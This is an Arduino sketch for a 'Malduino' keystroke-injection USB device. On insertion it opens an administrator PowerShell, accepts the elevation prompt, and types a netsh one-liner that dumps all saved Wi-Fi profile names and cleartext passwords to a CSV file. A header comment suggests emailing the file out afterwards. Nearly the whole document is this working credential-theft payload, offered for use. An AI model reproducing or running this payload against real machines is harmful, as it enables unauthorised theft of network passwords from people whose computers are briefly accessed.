#Malduino script too dump WIFI passwords
#You can then send it via email (using powershell, see other examples) 

#include "Keyboard.h"
#include "Mouse.h"

#define blinkInterval 50
#define ledPin 3
#define buttonPin 6

int defaultDelay = 4;
int defaultCharDelay = 5;
int rMin = 0;
int rMax = 100;

bool ledOn = true;

void typeKey(int key){
  Keyboard.press(key);
  delay(defaultCharDelay);
  Keyboard.release(key);
}

void setup(){
  
  pinMode(buttonPin, INPUT_PULLUP);
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, HIGH);
  
  if(digitalRead(buttonPin) == LOW){
    
    Keyboard.begin();
    Mouse.begin();

    delay(1000);
    Keyboard.press(KEY_LEFT_GUI);
    delay(defaultCharDelay);
    Keyboard.press(120); //x
    delay(defaultCharDelay);
    Keyboard.releaseAll(); 
    delay(500);
    typeKey(97); //a
    delay(defaultDelay);
    delay(500);
    typeKey(KEY_LEFT_ALT);
    delay(defaultCharDelay);
    typeKey(121); //y
    delay(defaultCharDelay);
    delay(500);
    Keyboard.print("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} |  Select-String \"Key Content\\W+\\:(.+)$\"  | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} |  %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }}  |  Export-Csv -Path $env:userprofile\\temp.csv;exit");
    typeKey(KEY_RETURN);
    
    
    Keyboard.end();
  }
}

void loop(){
  ledOn = !ledOn;
  digitalWrite(ledPin, ledOn);
  delay(blinkInterval);
}
